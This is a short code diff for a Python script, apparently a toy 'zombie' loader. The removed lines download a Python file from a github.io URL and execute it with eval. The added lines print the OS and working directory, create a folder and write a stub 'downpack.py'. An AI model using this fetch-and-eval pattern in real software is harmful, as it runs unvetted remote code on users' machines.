@@ -1,4 +1,5 @@
-print('Load Finished')
-url = 'https://nhzzz.github.io/ista/test.py'
-r = requests.get(url=url)
-eval(r.text)
+import os
+print('You Are Running In ' + os.name + ' ' + os.getcwd())
+os.system('mkdir sb')
+f = open('downpack.py','w')
+f.write("print ('download from Zombie github')")
